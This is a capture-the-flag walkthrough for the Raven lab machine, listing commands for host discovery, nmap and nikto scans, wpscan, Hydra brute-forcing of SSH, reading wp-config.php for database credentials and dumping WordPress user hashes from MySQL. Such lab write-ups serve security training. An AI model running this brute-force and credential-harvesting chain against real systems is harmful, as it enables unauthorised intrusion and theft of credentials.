1:
Find Ip for target Machine by using:
 
        netdiscover -i <interface> -r <Ip>/24 

Take the Ip's from the results and put it in a text file called IPs.txt

2:
Port Scan the IP's 
      
      nmap -F -iL <directory path>/IPs.txt 

use this to find the target machine we will call it <IP> from here out because depending on VM settings the #'s can be different
      
3: 
Nmap will reveal that port 80 is open so naturally

      nikto -h http://<IP>/
      
4:
nikto will show wordpress is installed 

5:
Inspect Elements on <IP>/services.html to find flag1

6: 

      wpscan the <IP>/wordpress/ site 
      check out the commands folder for the specific command 
7: 
      attack the ssh protocal with the usernames list you found 
      use Hydra, check the commands folder for the specific command 

8: 
Now you have micheales creds 

        ssh michael@<IP> 
          password: <you should know it from earlier wont be that easy>
          
9: 
Now we are in 

        cd ./var/www/
        ls -l 
        cat flag2
        
10: read the wordpress config file for the DB info 

        michael@Raven:~$ cat /var/www/html/wordpress/wp-config.php

11: 
Hopefully we realized by now that if its Wordpress we are attacking which is just controls serving the webpage and directory we realize that theres a DB as well with this info 
and what other DB to check for then the infamous Mysql 

      mysql -u root -p
      password: <use the password from teh config file we read in step 10>
      
12:
Now that you have signed into the mysql server you shoul dhave the mysql> cmd line 

  A: 
    mysql> show databases;
  B:
    mysql> use wordpress;
  C: 
    mysql> show tables;
  D:
  mysql> select * from wp_users; #gives the hashes for users BUT!!!!#
  E!: 
    mysql> select * from wp_users;
    
     that will give you flag 3 and 4 and thats it all 4 flags found with root access to DB thats mission complete!
